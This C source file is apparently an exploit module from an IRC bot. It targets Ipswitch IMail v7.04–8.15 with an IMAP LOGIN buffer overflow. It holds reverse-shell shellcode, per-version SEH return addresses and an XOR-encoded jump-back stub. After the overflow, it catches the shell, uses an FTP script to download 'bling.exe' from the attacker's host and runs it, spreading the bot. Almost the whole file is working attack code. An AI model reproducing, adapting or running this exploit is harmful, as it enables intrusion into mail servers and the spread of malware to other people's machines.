#ifndef NO_IMAIL

#include "includes.h"
#include "functions.h"
#include "externs.h"

#pragma warning(disable:4244)


char header[]=
"a01 LOGIN \"&";

//Ipswitch IMail v8.xx exploit by JGS & Insane. Tested working on v7.04 - v8.15

/* win32_reverse -  EXITFUNC=seh LHOST=0.0.0.0 LPORT=0 Size=312 Encoder=Pex http://metasploit.com */
char xshellcode[]=

"\x2b\xc9\x83\xe9\xb8\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe0"
"\x1a\x1f\x7c\x83\xee\xfc\xe2\xf4\x1c\x70\xf4\x31\x08\xe3\xe0\x83"
"\x1f\x7a\x94\x10\xc4\x3e\x94\x39\xdc\x91\x63\x79\x98\x1b\xf0\xf7"
"\xaf\x02\x94\x23\xc0\x1b\xf4\x35\x6b\x2e\x94\x7d\x0e\x2b\xdf\xe5"
"\x4c\x9e\xdf\x08\xe7\xdb\xd5\x71\xe1\xd8\xf4\x88\xdb\x4e\x3b\x54"
"\x95\xff\x94\x23\xc4\x1b\xf4\x1a\x6b\x16\x54\xf7\xbf\x06\x1e\x97"
"\xe3\x36\x94\xf5\x8c\x3e\x03\x1d\x23\x2b\xc4\x18\x6b\x59\x2f\xf7"
"\xa0\x16\x94\x0c\xfc\xb7\x94\x3c\xe8\x44\x77\xf2\xae\x14\xf3\x2c"
"\x1f\xcc\x79\x2f\x86\x72\x2c\x4e\x88\x6d\x6c\x4e\xbf\x4e\xe0\xac"
"\x88\xd1\xf2\x80\xdb\x4a\xe0\xaa\xbf\x93\xfa\x1a\x61\xf7\x17\x7e"
"\xb5\x70\x1d\x83\x30\x72\xc6\x75\x15\xb7\x48\x83\x36\x49\x4c\x2f"
"\xb3\x59\x4c\x3f\xb3\xe5\xcf\x14\x9f\x1a\x1f\x7d\x86\x72\x1b\xae"
"\x86\x49\x96\x9d\x75\x72\xf3\x85\x4a\x7a\x48\x83\x36\x70\x0f\x2d"
"\xb5\xe5\xcf\x1a\x8a\x7e\x79\x14\x83\x77\x75\x2c\xb9\x33\xd3\xf5"
"\x07\x70\x5b\xf5\x02\x2b\xdf\x8f\x4a\x8f\x96\x81\x1e\x58\x32\x82"
"\xa2\x36\x92\x06\xd8\xb1\xb4\xd7\x88\x68\xe1\xcf\xf6\xe5\x6a\x54"
"\x1f\xcc\x44\x2b\xb2\x4b\x4e\x2d\x8a\x1b\x4e\x2d\xb5\x4b\xe0\xac"
"\x88\xb7\xc6\x79\x2e\x49\xe0\xaa\x8a\xe5\xe0\x4b\x1f\xca\x77\x9b"
"\x99\xdc\x66\x83\x95\x1e\xe0\xaa\x1f\x6d\xe3\x83\x30\x72\xef\xf6"
"\xe4\x45\x4c\x83\x36\xe5\xcf\x7c";

char jump[]=
"\xEB\x04";

//8.04 - 7.15
char ppr704[]=
"\xEB\x02\x01\x10"; // imailsec.dll pop/pop/ret (v7.04)
char ppr705[]=
"\xBB\x03\x01\x10"; // imailsec.dll pop/pop/ret (v7.05)
char ppr706[]=
"\xCB\x08\x01\x10"; // imailsec.dll pop/pop/ret (v7.06)
char ppr710[]=
"\xD9\x02\x01\x10"; // imailsec.dll pop/pop/ret (v7.10 & 7.11)
char ppr712[]=
"\x1B\x03\x01\x10"; // imailsec.dll pop/pop/ret (v7.12)
char ppr713[]=
"\x69\x02\x01\x10"; // imailsec.dll pop/pop/ret (v7.13 & 7.14)
char ppr715[]=
"\x96\x02\x01\x10"; // imailsec.dll pop/pop/ret (v7.15)
//8.00 - 8.05
char ppr800[]=
"\xe2\x02\x01\x10"; // imailsec.dll pop/pop/ret (v8.00)
char ppr801[]=
"\xe2\x02\x01\x10"; // imailsec.dll pop/pop/ret (v8.01)
char ppr802[]=
"\xe2\x02\x01\x10"; // imailsec.dll pop/pop/ret (v8.02)
char ppr803[]=
"\xe2\x02\x01\x10"; // imailsec.dll pop/pop/ret (v8.03)
char ppr804[]=
"\x02\x03\x01\x10"; // imailsec.dll pop/pop/ret (v8.04)
char ppr805[]=
"\xd4\x49\x02\x10"; // imailsec.dll pop/pop/ret (v8.05) 100249d4
//8.10 - 8.15
char ppr810[]=
"\xBB\xD9\x01\x10"; // mailbox.dll pop/pop/ret (v8.10) 1001D9BB zonder HF 10023009 HF2
//"\x09\x30\x02\x10";
char ppr811[]=
"\xE6\x18\x02\x10"; // mailbox.dll pop/pop/ret (v8.11)
char ppr812[]=
"\x82\x17\x02\x10"; // mailbox.dll pop/pop/ret (v8.12)
char ppr813[]=
"\x51\x1A\x02\x10"; // mailbox.dll pop/pop/ret (v8.13)
char ppr814[]=
"\x51\x1A\x02\x10"; // mailbox.dll pop/pop/ret (v8.14) 10021a51 zonder HF 1001DADB met HF1
char ppr815[]=
"\x62\x1A\x02\x10"; // mailbox.dll pop/pop/ret (v8.15) 10021a62


char jumpback[]=
"\xEB\x0F\x5B\x33\xC9\x66\x83\xE9\xE0\x80\x33\x55\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF" //xor decoder
"\x8C\xBB\x8C\x21\x71\xA1\x0C\xD5\x94\x5F\xC5\xAB\x98\xAB\x98\xD5\xBC\x15\xAA\xB4"; //jump back xorred



char end[]=
"\" \"We0wn\"\r\n";

 unsigned int isock,sock2,sock3,addr,rc,rc2;
 char buffer[1024];
 char recvbuf[256];

BOOL ImailExp(EXINFO exinfo)
{  


 int len=16;
 struct sockaddr_in exploitz;
 struct hostent * hp;
 struct timeval tv;
 fd_set fds;
 int headerX;
 int ip;
 int port;
 int mport= (2000+rand()%1000);
 int ipX;
 int portX;

 hp = fgethostbyname(exinfo.ip);

 if (!hp) addr = inet_addr(exinfo.ip);
 if ((!hp)  && (addr == INADDR_NONE) )
 {
  return 0;
 }

 isock=fsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

 if (!isock)
 { 
  return 0;
 }
  
 if (hp != NULL)
	 memcpy(&(exploitz.sin_addr),hp->h_addr,hp->h_length);
 else
	 exploitz.sin_addr.s_addr = addr;

 if (hp)
	 exploitz.sin_family = hp->h_addrtype;
 else
	 exploitz.sin_family = AF_INET;

 exploitz.sin_port=fhtons(exinfo.port);


 // *** GET INFO **************************************************************

 //MessageBox(NULL,MyCurrentIp,NULL,NULL);
 ip=finet_addr(GetIP(exinfo.sock));
 port=fhtons(mport);


 // *** PREPARE THE SHELLCODE *************************************************
 ipX = ip^(ULONG)0x7c1f1ae0; // \xe0\x1a\x1f\x7c
 portX = port^(USHORT)0x7c1f;// \x1f\x7c

 memcpy ( &xshellcode[184], &ipX, 4 );
 memcpy ( &xshellcode[190], &portX, 2 );
 // ****************************************************************************
 // *** PREPARE THE BUFFER   ***************************************************
 headerX=sizeof(header)-1;
 memset(buffer, 0x90, headerX+890);							// Fill the buffer
 memcpy(&buffer[0], header, headerX);							// Copy the login header
 memcpy(&buffer[headerX+160], xshellcode, sizeof(xshellcode)-1);				// Copy the shellcode
 memcpy(&buffer[headerX+704], jumpback, sizeof(jumpback)-1);				// Copy the jump back code
 memcpy(&buffer[headerX+890], end, sizeof(end)-1);					// Copy the END
// ****************************************************************************
// *** PREPARE THE TARGETS ***************************************************
//test versie 8.0
// memcpy(&buffer[headerX+686], jump, 2);						// JMP 4 bytes over pop pop ret
// memcpy(&buffer[headerX+688], ppr800, 4);						// POP/POP/RET version
//test versie 8.12
// memcpy(&buffer[headerX+678], jump, 2);						// JMP 4 bytes over pop pop ret
// memcpy(&buffer[headerX+680], ppr812, 4);						// POP/POP/RET version
// ***************************************************************************

 rc=fconnect(isock, (struct sockaddr *) &exploitz, sizeof (struct sockaddr_in));

 if(rc==0)
 {

		rc2=frecv(isock,recvbuf,256,0);

		if(rc2<0)
		{
		fclosesocket(isock);;
		return 0;
		}


	if (strstr(recvbuf,"IMail")!=0)
	{

		 //check version 7.*
		if  (strstr(recvbuf,"7.04")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr704, 4);
		}
		else if (strstr(recvbuf,"7.05")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr705, 4);
		}
		else if (strstr(recvbuf,"7.06")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr706, 4);
		}
		else if (strstr(recvbuf,"7.07")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr706, 4);
		}
		else if (strstr(recvbuf,"7.10")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr710, 4);
		}
		else if (strstr(recvbuf,"7.11")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr710, 4);
		}
		else if (strstr(recvbuf,"7.12")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr712, 4);
		}
		else if (strstr(recvbuf,"7.13")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr713, 4);
		}
		else if (strstr(recvbuf,"7.14")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr713, 4);
		}
		else if (strstr(recvbuf,"7.15")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr715, 4);
		}
		//check version 8.00 - 8.05       
		else if (strstr(recvbuf,"8.00")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr800, 4);
		}
		else if (strstr(recvbuf,"8.01")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr801, 4);
		}
		else if (strstr(recvbuf,"8.02")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr802, 4);
		}
		else if (strstr(recvbuf,"8.03")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr803, 4);
		}
		else if (strstr(recvbuf,"8.04")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr804, 4);
		}
		else if (strstr(recvbuf,"8.05")!=0){
		   memcpy(&buffer[headerX+686], jump, 2);
           memcpy(&buffer[headerX+688], ppr805, 4);
		}
		//check version 8.10 - 8.15 
		else if (strstr(recvbuf,"8.10")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr810, 4);
		}
		else if (strstr(recvbuf,"8.11")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr811, 4);
		}
		else if (strstr(recvbuf,"8.12")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr812, 4);
		}
		else if (strstr(recvbuf,"8.13")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr813, 4);
		}
		else if (strstr(recvbuf,"8.14")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr814, 4);
		}
		else if (strstr(recvbuf,"8.15")!=0){
		   memcpy(&buffer[headerX+678], jump, 2);
           memcpy(&buffer[headerX+680], ppr815, 4);
		}
		else if (strstr(recvbuf,"hotfix2")!=0){
		   fclosesocket(isock);;
		   return 0;
		}
		else if (strstr(recvbuf,"4.0")!=0){
		   fclosesocket(isock);;
		   return 0;
		}
		else if (strstr(recvbuf,"5.0")!=0){
		   fclosesocket(isock);;
		   return 0;
		}
		else if (strstr(recvbuf,"6.0")!=0){
		   fclosesocket(isock);;
		   return 0;
		}
		else if (strstr(recvbuf,"7.0")!=0){
		   fclosesocket(isock);;
		   return 0;
		}
		else {
		fclosesocket(isock);;
		return 0;
		}
	}

	 else if (strstr(recvbuf,"IMail") == 0)
     {
	  fclosesocket(isock);;
	  return 0;
     }

	Sleep(100);
	fsend(isock,buffer,strlen(buffer),0);
	Sleep(100);

	exploitz.sin_addr.s_addr = 0;
	exploitz.sin_port=fhtons((unsigned short)mport);

	sock2=fsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	rc=fbind(sock2,(struct sockaddr *)&exploitz, 16);

	if(rc!=0)
	{
		return 0;
	}

	rc=flisten(sock2,1);

	if(rc!=0)
	{
		return 0;
	}

	tv.tv_sec = 8;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(sock2,&fds);

	if((select(1,&fds,0,0,&tv))>0)
	{
		sock3 = faccept(sock2, (struct sockaddr*)&exploitz, &len);
		//char sendbuf[IRCLINE];
		//_snprintf(sendbuf, sizeof(sendbuf), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		//irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
		//addlog(sendbuf);
		exploit[exinfo.exploit].stats++;
		shell(exinfo, sock3);
	}
	else
	{
		return 0;
	}
 
 
 }

 else
 {
	return 0;
 }

			fclosesocket(isock);;
			fclosesocket(sock2);
			fclosesocket(sock3);


return 0;

}

void shell(EXINFO exinfo, int sock)
{
	
	char buf[1024];
	char mkdir_buff[1024];
	int len;

	if(frecv(sock,buf,sizeof(buf),0) == SOCKET_ERROR )
	{
		return;
	}

	_snprintf(mkdir_buff, sizeof (mkdir_buff),"echo open %s %d > o&echo user 1 1 >> o &echo get bling.exe >> o &echo quit >> o &ftp -n -s:o\r\n", GetIP(exinfo.sock),(unsigned short)ftpport);	

	if(fsend(sock,mkdir_buff,strlen(mkdir_buff),0) == -1)
	{
		return;
	}

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "bling.exe\r\n");


	if (fsend(sock, mkdir_buff, strlen(mkdir_buff),0) == -1)
	{
		return;
	}
	len = frecv(sock, recvbuf, 1024, 0);

	fclosesocket(sock);
	return;

}
#endif